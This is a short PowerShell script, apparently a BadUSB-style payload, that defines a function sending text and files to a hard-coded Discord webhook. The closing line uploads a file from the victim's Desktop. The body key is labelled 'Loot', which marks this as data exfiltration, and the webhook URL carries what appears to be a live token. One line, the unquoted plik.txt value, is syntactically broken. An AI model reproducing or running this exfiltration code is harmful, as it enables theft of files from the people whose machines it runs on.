function Upload-Discord {
[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)
$hookurl = 'https://discord.com/api/webhooks/1428302116455186532/dOdkUVnlx0Av1blb5VRDr4-JrUH_Hdta2cTM6m7HJ1oHPV1Mc2DfFwd6x3b1WT0_Gfzp'
$Body = @{
  'Loot' = plik.txt
  'content' = $text
}
if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
Upload-Discord -file "$env:USERPROFILE\Desktop\plik.txt"
